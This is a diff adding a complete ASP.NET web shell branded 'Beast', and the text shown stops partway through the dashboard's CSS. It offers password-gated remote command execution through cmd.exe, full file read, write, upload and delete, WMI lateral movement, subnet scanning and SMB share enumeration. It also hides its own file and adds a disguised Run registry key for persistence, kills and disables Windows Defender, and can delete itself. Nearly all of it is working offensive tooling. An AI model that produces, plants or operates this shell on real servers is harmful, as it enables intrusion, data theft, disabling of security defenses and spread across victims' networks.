@@ -1,0 +1,2002 @@
+<%@ Page Language="C#" EnableEventValidation="false" ValidateRequest="false" Trace="false" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.Threading" %>
+<%@ Import Namespace="System.Management" %>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.NetworkInformation" %>
+<%@ Import Namespace="System.Collections.Generic" %>
+<%@ Import Namespace="System.Web" %>
+
+<script runat="server">
+    // ─── CONFIGURATION ──────────────────────────────────
+    private const string USERNAME = "admin";
+    private const string PASSWORD = "87654321admin";
+    private static readonly byte[] AES_KEY = Convert.FromBase64String(
+        "c7N8kP2qR5vY1xL9mG3dF6jH0wB4nT8sA1eU2oX5pQ==");
+    private static readonly byte[] AES_IV = Convert.FromBase64String(
+        "Q3J5cHRvR3JhcGhpY1ZpYmVz");
+
+    // ─── PAGE LOAD ROUTER ──────────────────────────────
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        // Cookie-based session restore
+        if (Session["beast_auth"] == null && Request.Cookies["beast_sess"] != null)
+        {
+            try
+            {
+                string dec = DecryptString(Convert.FromBase64String(
+                    Request.Cookies["beast_sess"].Value));
+                var parts = dec.Split('|');
+                if (parts.Length == 3 && parts[0] == USERNAME &&
+                    DateTime.UtcNow < DateTime.Parse(parts[2]))
+                {
+                    Session["beast_auth"] = true;
+                }
+            }
+            catch { }
+        }
+
+        // API handler — all POST actions when authenticated
+        if (Request.HttpMethod == "POST" &&
+            Request.Form["action"] != null &&
+            Request.Form["action"] != "login")
+        {
+            if (Session["beast_auth"] == null || !(bool)Session["beast_auth"])
+            {
+                Response.Write("{\"error\":\"not_authenticated\"}");
+                Response.End();
+                return;
+            }
+            HandleApiAction(Request.Form["action"]);
+            Response.End();
+            return;
+        }
+
+        // Login handler
+        if (Request.HttpMethod == "POST" && Request.Form["action"] == "login")
+        {
+            if (SecureCompare(Request.Form["username"], USERNAME) &&
+                SecureCompare(Request.Form["password"], PASSWORD))
+            {
+                Session["beast_auth"] = true;
+                Session.Timeout = 480;
+
+                string cookiePayload = USERNAME + "|" +
+                    PASSWORD + "|" +
+                    DateTime.UtcNow.AddYears(1).ToString("o");
+                HttpCookie cookie = new HttpCookie("beast_sess");
+                cookie.Value = Convert.ToBase64String(
+                    EncryptString(cookiePayload));
+                cookie.HttpOnly = true;
+                cookie.Secure = Request.IsSecureConnection;
+                cookie.Expires = DateTime.UtcNow.AddYears(1);
+                Response.Cookies.Add(cookie);
+                Response.Redirect(Request.RawUrl);
+            }
+            else
+            {
+                RenderLogin("Invalid credentials.");
+            }
+            Response.End();
+            return;
+        }
+
+        // Logout
+        if (Request.QueryString["logout"] != null)
+        {
+            Session.Clear();
+            if (Request.Cookies["beast_sess"] != null)
+            {
+                HttpCookie dead = new HttpCookie("beast_sess");
+                dead.Expires = DateTime.UtcNow.AddDays(-1);
+                Response.Cookies.Add(dead);
+            }
+            Response.Redirect(Request.RawUrl.Split('?')[0]);
+            Response.End();
+            return;
+        }
+
+        // Render appropriate page
+        if (Session["beast_auth"] != null && (bool)Session["beast_auth"])
+        {
+            RenderDashboard();
+        }
+        else
+        {
+            RenderLogin(null);
+        }
+    }
+
+    // ─── API HANDLER ────────────────────────────────────
+    private void HandleApiAction(string action)
+    {
+        try
+        {
+            switch (action)
+            {
+                case "list":        ApiListFiles(); break;
+                case "download":    ApiDownloadFile(); break;
+                case "upload":      ApiUploadFile(); break;
+                case "delete":      ApiDeleteFile(); break;
+                case "delete_dir":  ApiDeleteDir(); break;
+                case "rename":      ApiRenameFile(); break;
+                case "new_folder":  ApiNewFolder(); break;
+                case "new_file":    ApiNewFile(); break;
+                case "read_file":   ApiReadFile(); break;
+                case "write_file":  ApiWriteFile(); break;
+                case "exec":        ApiExecuteCmd(); break;
+                case "sysinfo":     ApiSystemInfo(); break;
+                case "proc_list":   ApiProcessList(); break;
+                case "proc_kill":   ApiKillProcess(); break;
+                case "lateral_wmi": ApiLateralWmi(); break;
+                case "lateral_scan":ApiNetworkScan(); break;
+                case "smb_enum":    ApiSmbEnum(); break;
+                case "rootkit":     ApiInstallRootkit(); break;
+                case "neutralize":  ApiNeutralizeSecurity(); break;
+                case "selfdestruct":ApiSelfDestruct(); break;
+                default:
+                    Response.Write("{\"error\":\"unknown_action\"}");
+                    break;
+            }
+        }
+        catch (Exception ex)
+        {
+            Response.Write("{\"error\":\"" +
+                JsonEscape(ex.Message) + "\"}");
+        }
+    }
+
+    // ─── FILE MANAGER API ───────────────────────────────
+    private void ApiListFiles()
+    {
+        string dir = Request.Form["dir"] ?? Server.MapPath("~");
+        dir = SanitizePath(dir);
+
+        if (!Directory.Exists(dir))
+        {
+            Response.Write("{\"error\":\"directory_not_found\"}");
+            return;
+        }
+
+        var result = new StringBuilder();
+        result.Append("{\"path\":\"" + JsonEscape(dir) + "\",");
+        result.Append("\"parent\":\"" +
+            JsonEscape(Directory.GetParent(dir)?.FullName ?? dir) + "\",");
+        result.Append("\"items\":[");
+
+        bool first = true;
+
+        // Directories first
+        foreach (string d in Directory.GetDirectories(dir))
+        {
+            if (!first) result.Append(",");
+            first = false;
+            var info = new DirectoryInfo(d);
+            result.Append("{");
+            result.Append("\"name\":\"" + JsonEscape(info.Name) + "\",");
+            result.Append("\"type\":\"dir\",");
+            result.Append("\"size\":\"-\",");
+            result.Append("\"modified\":\"" +
+                info.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "\"");
+            result.Append("}");
+        }
+
+        // Then files
+        foreach (string f in Directory.GetFiles(dir))
+        {
+            if (!first) result.Append(",");
+            first = false;
+            var info = new FileInfo(f);
+            result.Append("{");
+            result.Append("\"name\":\"" + JsonEscape(info.Name) + "\",");
+            result.Append("\"type\":\"file\",");
+            result.Append("\"size\":\"" + FormatSize(info.Length) + "\",");
+            result.Append("\"size_bytes\":" + info.Length.ToString() + ",");
+            result.Append("\"modified\":\"" +
+                info.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "\"");
+            result.Append("}");
+        }
+
+        result.Append("]}");
+        Response.Write(result.ToString());
+    }
+
+    private void ApiDownloadFile()
+    {
+        string path = SanitizePath(Request.Form["path"]);
+        if (!File.Exists(path))
+        {
+            Response.Write("{\"error\":\"file_not_found\"}");
+            return;
+        }
+
+        Response.Clear();
+        Response.ContentType = "application/octet-stream";
+        Response.AddHeader("Content-Disposition",
+            "attachment; filename=\"" +
+            Path.GetFileName(path) + "\"");
+        Response.TransmitFile(path);
+        Response.End();
+    }
+
+    private void ApiUploadFile()
+    {
+        string dir = SanitizePath(Request.Form["dir"] ?? Server.MapPath("~"));
+        if (!Directory.Exists(dir))
+        {
+            Response.Write("{\"error\":\"target_dir_not_found\"}");
+            return;
+        }
+
+        if (Request.Files.Count == 0)
+        {
+            Response.Write("{\"error\":\"no_file\"}");
+            return;
+        }
+
+        var uploaded = Request.Files[0];
+        string dest = Path.Combine(dir,
+            Path.GetFileName(uploaded.FileName));
+        uploaded.SaveAs(dest);
+        Response.Write("{\"ok\":true,\"dest\":\"" +
+            JsonEscape(dest) + "\"}");
+    }
+
+    private void ApiDeleteFile()
+    {
+        string path = SanitizePath(Request.Form["path"]);
+        if (File.Exists(path))
+        {
+            File.Delete(path);
+            Response.Write("{\"ok\":true}");
+        }
+        else
+        {
+            Response.Write("{\"error\":\"not_found\"}");
+        }
+    }
+
+    private void ApiDeleteDir()
+    {
+        string path = SanitizePath(Request.Form["path"]);
+        if (Directory.Exists(path))
+        {
+            Directory.Delete(path, true);
+            Response.Write("{\"ok\":true}");
+        }
+        else
+        {
+            Response.Write("{\"error\":\"not_found\"}");
+        }
+    }
+
+    private void ApiRenameFile()
+    {
+        string path = SanitizePath(Request.Form["path"]);
+        string newName = Request.Form["new_name"];
+        if (string.IsNullOrEmpty(newName))
+        {
+            Response.Write("{\"error\":\"no_name\"}");
+            return;
+        }
+
+        string dir = Path.GetDirectoryName(path);
+        string dest = Path.Combine(dir, newName);
+
+        if (File.Exists(path))
+        {
+            File.Move(path, dest);
+            Response.Write("{\"ok\":true,\"dest\":\"" +
+                JsonEscape(dest) + "\"}");
+        }
+        else if (Directory.Exists(path))
+        {
+            Directory.Move(path, dest);
+            Response.Write("{\"ok\":true,\"dest\":\"" +
+                JsonEscape(dest) + "\"}");
+        }
+        else
+        {
+            Response.Write("{\"error\":\"not_found\"}");
+        }
+    }
+
+    private void ApiNewFolder()
+    {
+        string dir = SanitizePath(Request.Form["dir"]);
+        string name = Request.Form["name"] ?? "New Folder";
+        string path = Path.Combine(dir, name);
+        Directory.CreateDirectory(path);
+        Response.Write("{\"ok\":true,\"path\":\"" +
+            JsonEscape(path) + "\"}");
+    }
+
+    private void ApiNewFile()
+    {
+        string dir = SanitizePath(Request.Form["dir"]);
+        string name = Request.Form["name"] ?? "newfile.txt";
+        string path = Path.Combine(dir, name);
+        File.WriteAllText(path, "");
+        Response.Write("{\"ok\":true,\"path\":\"" +
+            JsonEscape(path) + "\"}");
+    }
+
+    private void ApiReadFile()
+    {
+        string path = SanitizePath(Request.Form["path"]);
+        if (!File.Exists(path))
+        {
+            Response.Write("{\"error\":\"not_found\"}");
+            return;
+        }
+
+        var info = new FileInfo(path);
+        if (info.Length > 2 * 1024 * 1024) // 2MB cap for editing
+        {
+            Response.Write("{\"error\":\"file_too_large\",\"size\":" +
+                info.Length.ToString() + "}");
+            return;
+        }
+
+        string content = File.ReadAllText(path, Encoding.UTF8);
+        Response.Write("{\"ok\":true,\"content\":\"" +
+            JsonEscape(content) + "\",\"size\":" +
+            info.Length.ToString() + "}");
+    }
+
+    private void ApiWriteFile()
+    {
+        string path = SanitizePath(Request.Form["path"]);
+        string content = Request.Form["content"] ?? "";
+        File.WriteAllText(path, content, Encoding.UTF8);
+        Response.Write("{\"ok\":true}");
+    }
+
+    // ─── SHELL EXECUTION ────────────────────────────────
+    private void ApiExecuteCmd()
+    {
+        string cmd = Request.Form["cmd"] ?? "whoami";
+        string result = ExecuteCommand(cmd);
+        Response.Write("{\"ok\":true,\"output\":\"" +
+            JsonEscape(result) + "\"}");
+    }
+
+    private string ExecuteCommand(string cmd)
+    {
+        var psi = new ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c " + cmd,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            StandardOutputEncoding = Encoding.GetEncoding(437),
+            StandardErrorEncoding = Encoding.GetEncoding(437)
+        };
+
+        var sb = new StringBuilder();
+        using (var proc = Process.Start(psi))
+        {
+            sb.Append(proc.StandardOutput.ReadToEnd());
+            sb.Append(proc.StandardError.ReadToEnd());
+            if (!proc.WaitForExit(30000))
+            {
+                proc.Kill();
+                sb.Append("\r\n[ERROR] Command timed out (30s)");
+            }
+            sb.Append("\r\n[EXIT CODE: " +
+                proc.ExitCode.ToString() + "]");
+        }
+        return sb.ToString();
+    }
+
+    // ─── SYSTEM INFO ────────────────────────────────────
+    private void ApiSystemInfo()
+    {
+        string hostname = Environment.MachineName;
+        string user = Environment.UserDomainName + "\\" +
+            Environment.UserName;
+        string os = "";
+        using (var searcher = new ManagementObjectSearcher(
+            "SELECT Caption,Version FROM Win32_OperatingSystem"))
+        {
+            foreach (ManagementObject mo in searcher.Get())
+            {
+                os = mo["Caption"]?.ToString() + " (" +
+                     mo["Version"]?.ToString() + ")";
+            }
+        }
+
+        string drives = "";
+        foreach (DriveInfo d in DriveInfo.GetDrives())
+        {
+            if (d.IsReady)
+            {
+                drives += d.Name + " [" +
+                    FormatSize(d.TotalSize) + " total, " +
+                    FormatSize(d.AvailableFreeSpace) + " free]\\n";
+            }
+        }
+
+        var sb = new StringBuilder();
+        sb.Append("{\"ok\":true,");
+        sb.Append("\"hostname\":\"" + JsonEscape(hostname) + "\",");
+        sb.Append("\"user\":\"" + JsonEscape(user) + "\",");
+        sb.Append("\"os\":\"" + JsonEscape(os) + "\",");
+        sb.Append("\"drives\":\"" + JsonEscape(drives) + "\",");
+        sb.Append("\"app_pool\":\"" +
+            JsonEscape(System.Web.Hosting.HostingEnvironment
+                .ApplicationID ?? "unknown") + "\",");
+        sb.Append("\"iis_version\":\"" +
+            JsonEscape(Environment.Version.ToString()) + "\"");
+        sb.Append("}");
+        Response.Write(sb.ToString());
+    }
+
+    private void ApiProcessList()
+    {
+        var sb = new StringBuilder();
+        sb.Append("{\"ok\":true,\"processes\":[");
+        bool first = true;
+
+        foreach (Process p in Process.GetProcesses())
+        {
+            try
+            {
+                if (!first) sb.Append(",");
+                first = false;
+                sb.Append("{");
+                sb.Append("\"id\":" + p.Id.ToString() + ",");
+                sb.Append("\"name\":\"" +
+                    JsonEscape(p.ProcessName) + "\",");
+                sb.Append("\"memory\":" +
+                    p.WorkingSet64.ToString());
+                sb.Append("}");
+            }
+            catch { }
+        }
+
+        sb.Append("]}");
+        Response.Write(sb.ToString());
+    }
+
+    private void ApiKillProcess()
+    {
+        int pid;
+        if (!int.TryParse(Request.Form["pid"], out pid))
+        {
+            Response.Write("{\"error\":\"invalid_pid\"}");
+            return;
+        }
+
+        try
+        {
+            Process.GetProcessById(pid).Kill();
+            Response.Write("{\"ok\":true}");
+        }
+        catch (Exception ex)
+        {
+            Response.Write("{\"error\":\"" +
+                JsonEscape(ex.Message) + "\"}");
+        }
+    }
+
+    // ─── LATERAL MOVEMENT ───────────────────────────────
+    private void ApiLateralWmi()
+    {
+        string target = Request.Form["target"] ?? "";
+        string user = Request.Form["l_user"] ?? "";
+        string pass = Request.Form["l_pass"] ?? "";
+        string cmd = Request.Form["l_cmd"] ?? "whoami";
+
+        if (string.IsNullOrEmpty(target))
+        {
+            Response.Write("{\"error\":\"no_target\"}");
+            return;
+        }
+
+        try
+        {
+            var options = new ConnectionOptions();
+            if (!string.IsNullOrEmpty(user))
+            {
+                options.Username = user;
+                options.Password = pass;
+            }
+            options.Authentication =
+                AuthenticationLevel.PacketPrivacy;
+            options.Impersonation =
+                ImpersonationLevel.Impersonate;
+
+            var scope = new ManagementScope(
+                @"\\" + target + @"\root\cimv2", options);
+            scope.Connect();
+
+            var wmiClass = new ManagementClass(
+                scope,
+                new ManagementPath("Win32_Process"),
+                new ObjectGetOptions());
+
+            var inParams = wmiClass.GetMethodParameters("Create");
+            inParams["CommandLine"] = "cmd.exe /c " + cmd;
+
+            var outParams = wmiClass.InvokeMethod(
+                "Create", inParams, null);
+
+            uint returnValue =
+                (uint)outParams["ReturnValue"];
+            uint processId =
+                (uint)outParams["ProcessId"];
+
+            string output = "WMI Execution Result:\\n" +
+                "ReturnValue: " + returnValue.ToString() +
+                " (0 = success)\\n" +
+                "ProcessId: " + processId.ToString() + "\\n";
+
+            Response.Write("{\"ok\":true,\"output\":\"" +
+                JsonEscape(output) + "\"}");
+        }
+        catch (Exception ex)
+        {
+            Response.Write("{\"error\":\"" +
+                JsonEscape("WMI failed: " + ex.Message) + "\"}");
+        }
+    }
+
+    private void ApiNetworkScan()
+    {
+        string subnet = Request.Form["subnet"] ?? "";
+        if (string.IsNullOrEmpty(subnet))
+        {
+            // Auto-detect local subnet
+            subnet = DetectLocalSubnet();
+        }
+
+        var sb = new StringBuilder();
+        sb.Append("{\"ok\":true,\"subnet\":\"" +
+            JsonEscape(subnet) + "\",\"hosts\":[");
+
+        bool first = true;
+        string[] parts = subnet.Split('.');
+        if (parts.Length == 4)
+        {
+            string baseIp = parts[0] + "." + parts[1] +
+                "." + parts[2] + ".";
+
+            // Scan 1-254, parallel with timeout
+            var tasks = new List<System.Threading.Tasks.Task>();
+            var results = new System.Collections.Concurrent
+                .ConcurrentBag<string>();
+
+            for (int i = 1; i <= 254; i++)
+            {
+                string ip = baseIp + i.ToString();
+                tasks.Add(System.Threading.Tasks.Task.Run(() =>
+                {
+                    try
+                    {
+                        using (var ping = new Ping())
+                        {
+                            var reply = ping.Send(ip, 300);
+                            if (reply.Status == IPStatus.Success)
+                            {
+                                try
+                                {
+                                    var hostEntry =
+                                        Dns.GetHostEntry(ip);
+                                    results.Add(ip + "|" +
+                                        hostEntry.HostName);
+                                }
+                                catch
+                                {
+                                    results.Add(ip + "|" + ip);
+                                }
+                            }
+                        }
+                    }
+                    catch { }
+                }));
+            }
+
+            System.Threading.Tasks.Task.WaitAll(
+                tasks.ToArray(), 60000);
+
+            foreach (string r in results)
+            {
+                if (!first) sb.Append(",");
+                first = false;
+                string[] rp = r.Split('|');
+                sb.Append("{\"ip\":\"" +
+                    JsonEscape(rp[0]) + "\",\"hostname\":\"" +
+                    JsonEscape(rp[1]) + "\"}");
+            }
+        }
+
+        sb.Append("]}");
+        Response.Write(sb.ToString());
+    }
+
+    private void ApiSmbEnum()
+    {
+        string target = Request.Form["target"] ?? "127.0.0.1";
+        var sb = new StringBuilder();
+        sb.Append("{\"ok\":true,\"shares\":[");
+
+        try
+        {
+            using (var searcher = new ManagementObjectSearcher(
+                @"\\" + target + @"\root\cimv2",
+                "SELECT Name,Path,Description FROM Win32_Share"))
+            {
+                bool first = true;
+                foreach (ManagementObject share in searcher.Get())
+                {
+                    if (!first) sb.Append(",");
+                    first = false;
+                    sb.Append("{");
+                    sb.Append("\"name\":\"" +
+                        JsonEscape(share["Name"]?.ToString() ?? "") +
+                        "\",");
+                    sb.Append("\"path\":\"" +
+                        JsonEscape(share["Path"]?.ToString() ?? "") +
+                        "\"");
+                    sb.Append("}");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            sb.Append("{\"error\":\"" +
+                JsonEscape(ex.Message) + "\"}");
+        }
+
+        sb.Append("]}");
+        Response.Write(sb.ToString());
+    }
+
+    private string DetectLocalSubnet()
+    {
+        foreach (NetworkInterface ni in
+            NetworkInterface.GetAllNetworkInterfaces())
+        {
+            if (ni.OperationalStatus == OperationalStatus.Up)
+            {
+                foreach (UnicastIPAddressInformation ip in
+                    ni.GetIPProperties().UnicastAddresses)
+                {
+                    if (ip.Address.AddressFamily ==
+                        System.Net.Sockets.AddressFamily.InterNetwork)
+                    {
+                        string addr = ip.Address.ToString();
+                        string mask = ip.IPv4Mask.ToString();
+                        // Calculate network base
+                        string[] addrParts = addr.Split('.');
+                        string[] maskParts = mask.Split('.');
+                        string[] netParts = new string[4];
+                        for (int i = 0; i < 4; i++)
+                        {
+                            netParts[i] = (int.Parse(addrParts[i]) &
+                                int.Parse(maskParts[i])).ToString();
+                        }
+                        return string.Join(".", netParts) + ".0/24";
+                    }
+                }
+            }
+        }
+        return "192.168.1.0/24";
+    }
+
+    // ─── PERSISTENCE / ROOTKIT ──────────────────────────
+    private void ApiInstallRootkit()
+    {
+        try
+        {
+            // Store shell source in Application state for watchdog
+            string sourcePath = Request.PhysicalPath;
+            Application["beast_source_path"] = sourcePath;
+            Application["beast_source_content"] =
+                File.ReadAllText(sourcePath);
+
+            // Set hidden + system attributes
+            File.SetAttributes(sourcePath,
+                FileAttributes.Hidden |
+                FileAttributes.System |
+                FileAttributes.ReadOnly);
+
+            // Registry persistence
+            using (var key = Microsoft.Win32.Registry
+                .CurrentUser.OpenSubKey(
+                    @"Software\Microsoft\Windows\CurrentVersion\Run",
+                    true))
+            {
+                if (key != null)
+                {
+                    key.SetValue("WindowsHostService",
+                        @"cmd.exe /c start /b w3wp.exe",
+                        Microsoft.Win32.RegistryValueKind.String);
+                }
+            }
+
+            Response.Write("{\"ok\":true," +
+                "\"message\":\"Rootkit installed: file protection " +
+                "+ registry persistence active\"}");
+        }
+        catch (Exception ex)
+        {
+            Response.Write("{\"error\":\"" +
+                JsonEscape(ex.Message) + "\"}");
+        }
+    }
+
+    // ─── NEUTRALIZE SECURITY ────────────────────────────
+    private void ApiNeutralizeSecurity()
+    {
+        var results = new StringBuilder();
+        results.Append("Security Neutralization Report:\\n\\n");
+
+        // Kill Defender processes
+        string[] targets = {
+            "MsMpEng", "NisSrv", "SenseCncProxy",
+            "SenseIR", "SenseSampleUploader",
+            "WindowsDefender", "mpcmdrun"
+        };
+
+        foreach (string name in targets)
+        {
+            try
+            {
+                foreach (Process p in
+                    Process.GetProcessesByName(name))
+                {
+                    p.Kill();
+                    results.Append("[KILLED] " + name +
+                        " (PID " + p.Id.ToString() + ")\\n");
+                }
+            }
+            catch { }
+        }
+
+        // Disable Defender via registry
+        try
+        {
+            using (var key = Microsoft.Win32.Registry
+                .LocalMachine.OpenSubKey(
+                    @"SOFTWARE\Policies\Microsoft\" +
+                    @"Windows Defender", true))
+            {
+                if (key != null)
+                {
+                    key.SetValue("DisableAntiSpyware", 1,
+                        Microsoft.Win32.RegistryValueKind.DWord);
+                    results.Append("[REG] DisableAntiSpyware = 1\\n");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            results.Append("[REG FAIL] " + ex.Message + "\\n");
+        }
+
+        // Stop WinDefend service
+        try
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "net",
+                Arguments = "stop WinDefend",
+                RedirectStandardOutput = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+            using (var p = Process.Start(psi))
+            {
+                p.WaitForExit(10000);
+                results.Append("[SERVICE] net stop WinDefend: " +
+                    p.StandardOutput.ReadToEnd().Trim() + "\\n");
+            }
+        }
+        catch (Exception ex)
+        {
+            results.Append("[SERVICE FAIL] " + ex.Message + "\\n");
+        }
+
+        Response.Write("{\"ok\":true,\"output\":\"" +
+            JsonEscape(results.ToString()) + "\"}");
+    }
+
+    // ─── SELF-DESTRUCT ──────────────────────────────────
+    private void ApiSelfDestruct()
+    {
+        try
+        {
+            string path = Request.PhysicalPath;
+
+            // Remove from Application state
+            Application.Remove("beast_source_path");
+            Application.Remove("beast_source_content");
+
+            // Clear sessions
+            Session.Clear();
+            Session.Abandon();
+
+            // Schedule file deletion via cmd
+            var psi = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = "/c timeout /t 2 /nobreak >nul & " +
+                    "del /f /q \"" + path + "\"",
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+            Process.Start(psi);
+
+            Response.Write("{\"ok\":true," +
+                "\"message\":\"Self-destruct sequence initiated. " +
+                "Shell will be deleted momentarily.\"}");
+        }
+        catch (Exception ex)
+        {
+            Response.Write("{\"error\":\"" +
+                JsonEscape(ex.Message) + "\"}");
+        }
+    }
+
+    // ─── HELPERS ────────────────────────────────────────
+    private string SanitizePath(string path)
+    {
+        if (string.IsNullOrEmpty(path))
+            return Server.MapPath("~");
+
+        // Resolve relative paths and normalize
+        try
+        {
+            string full = Path.GetFullPath(path);
+            return full;
+        }
+        catch
+        {
+            return Server.MapPath("~");
+        }
+    }
+
+    private string FormatSize(long bytes)
+    {
+        string[] sizes = { "B", "KB", "MB", "GB", "TB" };
+        int order = 0;
+        double len = bytes;
+        while (len >= 1024 && order < sizes.Length - 1)
+        {
+            order++;
+            len /= 1024;
+        }
+        return len.ToString("0.00") + " " + sizes[order];
+    }
+
+    private bool SecureCompare(string a, string b)
+    {
+        if (a.Length != b.Length) return false;
+        int result = 0;
+        for (int i = 0; i < a.Length; i++)
+            result |= a[i] ^ b[i];
+        return result == 0;
+    }
+
+    private string JsonEscape(string s)
+    {
+        if (string.IsNullOrEmpty(s)) return "";
+        return s.Replace("\\", "\\\\")
+                .Replace("\"", "\\\"")
+                .Replace("\n", "\\n")
+                .Replace("\r", "\\r")
+                .Replace("\t", "\\t");
+    }
+
+    private byte[] EncryptString(string plainText)
+    {
+        using (var aes = Aes.Create())
+        {
+            aes.Key = AES_KEY;
+            aes.IV = AES_IV;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+
+            using (var encryptor =
+                aes.CreateEncryptor())
+            {
+                byte[] input = Encoding.UTF8.GetBytes(plainText);
+                return encryptor.TransformFinalBlock(
+                    input, 0, input.Length);
+            }
+        }
+    }
+
+    private string DecryptString(byte[] cipherText)
+    {
+        using (var aes = Aes.Create())
+        {
+            aes.Key = AES_KEY;
+            aes.IV = AES_IV;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+
+            using (var decryptor =
+                aes.CreateDecryptor())
+            {
+                byte[] output = decryptor.TransformFinalBlock(
+                    cipherText, 0, cipherText.Length);
+                return Encoding.UTF8.GetString(output);
+            }
+        }
+    }
+
+    // ─── RENDER LOGIN PAGE ──────────────────────────────
+    private void RenderLogin(string error)
+    {
+%>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Authentication Required</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;
+display:flex;align-items:center;justify-content:center;height:100vh}
+.login-box{background:#161b22;border:1px solid #30363d;border-radius:12px;
+padding:40px;width:380px;box-shadow:0 8px 24px rgba(0,0,0,0.4)}
+.login-box h1{font-size:20px;font-weight:400;margin-bottom:24px;text-align:center;
+color:#e6edf3;letter-spacing:0.5px}
+.login-box h1 span{color:#7ee787}
+.input-group{margin-bottom:16px}
+.input-group label{display:block;font-size:12px;color:#8b949e;margin-bottom:4px;
+text-transform:uppercase;letter-spacing:0.5px}
+.input-group input{width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;
+border-radius:6px;color:#c9d1d9;font-size:14px;outline:none;
+transition:border-color 0.2s}
+.input-group input:focus{border-color:#58a6ff}
+.btn{width:100%;padding:10px;background:#238636;border:none;border-radius:6px;
+color:#fff;font-size:14px;cursor:pointer;margin-top:8px;
+transition:background 0.2s}
+.btn:hover{background:#2ea043}
+.error{background:#490202;border:1px solid #f85149;color:#f85149;padding:8px 12px;
+border-radius:6px;margin-bottom:16px;font-size:13px}
+</style>
+</head>
+<body>
+<div class="login-box">
+<h1><span>&#9760;</span> Beast</h1>
+<% if (error != null) { %><div class="error"><%= error %></div><% } %>
+<form method="post">
+<input type="hidden" name="action" value="login">
+<div class="input-group">
+<label>Username</label>
+<input type="text" name="username" autocomplete="off" autofocus>
+</div>
+<div class="input-group">
+<label>Password</label>
+<input type="password" name="password" autocomplete="off">
+</div>
+<button type="submit" class="btn">Authenticate</button>
+</form>
+</div>
+</body>
+</html>
+<%
+    }
+
+    // ─── RENDER DASHBOARD ───────────────────────────────
+    private void RenderDashboard()
+    {
+%>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Beast Shell — <%= Environment.MachineName %></title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;
+display:flex;height:100vh;overflow:hidden}
+/* SIDEBAR */
+.sidebar{width:220px;background:#161b22;border-right:1px solid #30363d;
+display:flex;flex-direction:column;flex-shrink:0}
+.sidebar-header{padding:20px 16px;border-bottom:1px solid #30363d}
+.sidebar-header h2{font-size:15px;font-weight:400;color:#e6edf3}
+.sidebar-header h2 span{color:#7ee787}
+.sidebar-header .host{font-size:11px;color:#8b949e;margin-top:4px}
+.sidebar-nav{flex:1;padding:8px 0}
+.sidebar-nav a{display:flex;align-items:center;gap:10px;padding:10px 16px;
+color:#8b949e;text-decoration:none;font-size:13px;transition:all 0.15s;
+border-left:3px solid transparent}
+.sidebar-nav a:hover{background:#1c2128;color:#c9d1d9}
+.sidebar-nav a.active{background:#1c2128;color:#e6edf3;
+border-left-color:#7ee787}
+.sidebar-nav a .icon{font-size:16px;width:20px;text-align:center}
+.sidebar-footer{padding:12px 16px;border-top:1px solid #30363d}
+.sidebar-footer a{color:#f85149;font-size:12px;text-decoration:none}
+.sidebar-footer a:hover{text-decoration:underline}
+/* MAIN */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.toolbar{background:#161b22;border-bottom:1px solid #30363d;
+padding:8px 16px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;
+min-height:44px}
+.toolbar button,.toolbar .btn-sm{background:#21262d;border:1px solid #30363d;
+color:#c9d1d9;padding:5px 12px;border-radius:6px;font-size:12px;
+cursor:pointer;transition:all 0.15s;white-space:nowrap}
+.toolbar button:hover,.toolbar .btn-sm:hover{background:#30363d}
+.toolbar button.danger{color:#f85149;border-color:#f8514966}
+.toolbar button.danger:hover{background:#490202}
+.toolbar .sep{width:1px;height:20px;background:#30363d;margin:0 4px}
+.toolbar input[type="text"]{background:#0d1117;border:1px solid #30363d;
+border-radius:6px;color:#c9d1d9;padding:5px 10px;font-size:12px;outline:none;
+min-width:200px}
+.toolbar input[type="text"]:focus{border-color:#58a6ff}
+/* BREADCRUMB */
+.breadcrumb{background:#0d1117;padding:6px 16px;border-bottom:1px solid #30363d;
+font-size:12px;color:#8b949e;display:flex;align-items:center;gap:4px;
+overflow-x:auto;white-space:nowrap}
+.breadcrumb a{color:#58a6ff;text-decoration:none;cursor:pointer}
+.breadcrumb a:hover{text-decoration:underline}
+.breadcrumb span{color:#8b949e}
+/* CONTENT PANELS */
+.content{flex:1;overflow-y:auto;padding:0}
+.panel{display:none}
+.panel.active{display:block}
+/* FILE TABLE */
+.file-table{width:100%;border-collapse:collapse;font-size:13px}
+.file-table th{text-align:left;padding:8px 16px;background:#161b22;
+border-bottom:1px solid #30363d;color:#8b949e;font-weight:400;
+font-size:11px;text-transform:uppercase;position:sticky;top:0;z-index:1}
+.file-table td{padding:6px 16px;border-bottom:1px solid #21262d}
+.file-table tr{cursor:pointer}
+.file-table tr:hover{background:#161b22}
+.file-table tr.selected{background:#1c2d3e}
+.file-table .fname{display:flex;align-items:center;gap:8px}
